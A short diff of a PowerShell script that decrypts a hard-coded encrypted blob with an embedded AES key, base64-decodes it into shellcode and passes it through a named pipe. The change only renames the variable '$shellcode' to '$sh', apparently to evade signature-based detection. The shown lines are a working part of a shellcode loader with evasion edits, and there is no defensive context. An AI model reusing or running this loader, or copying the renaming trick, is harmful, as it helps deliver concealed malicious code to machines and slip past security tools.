@@ -49,8 +49,8 @@ $enc = "76492d1116743f0423413b16050a5345MgB8AFUAVwB3AEIAcABuAFkAWQBsAGUAOABWAEIA
 [byte[]] $k = 47,176,172,112,95,97,158,25,215,139,120,73,98,118,1,202,30,246,120,2,90,11,206,18,7,157,58,182,34,81,139,184
 $sec = ConvertTo-SecureString $enc -Key $k
 $p = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($sec))
-[Byte[]]$shellcode =[System.Convert]::FromBase64String($p)
-$SHLEN4 = $PIT * 4 + $shellcode.Length
+[Byte[]]$sh =[System.Convert]::FromBase64String($p)
+$SHLEN4 = $PIT * 4 + $sh.Length
 
 
 
@@ -68,7 +68,7 @@ $pipe.Close()
 $pipe = New-Object System.IO.Pipes.NamedPipeServerStream($pipeName, [System.IO.Pipes.PipeDirection]::Out)
 #$pipe.WaitForConnection()
 $pipe.Connect()
-$enc = [System.Convert]::ToBase64String($shellcode)
+$enc = [System.Convert]::ToBase64String($sh)
 $bytes = [System.Text.Encoding]::UTF8.GetBytes($enc)
 $pipe.Write($bytes, 0, $bytes.Length)
 $pipe.Close()
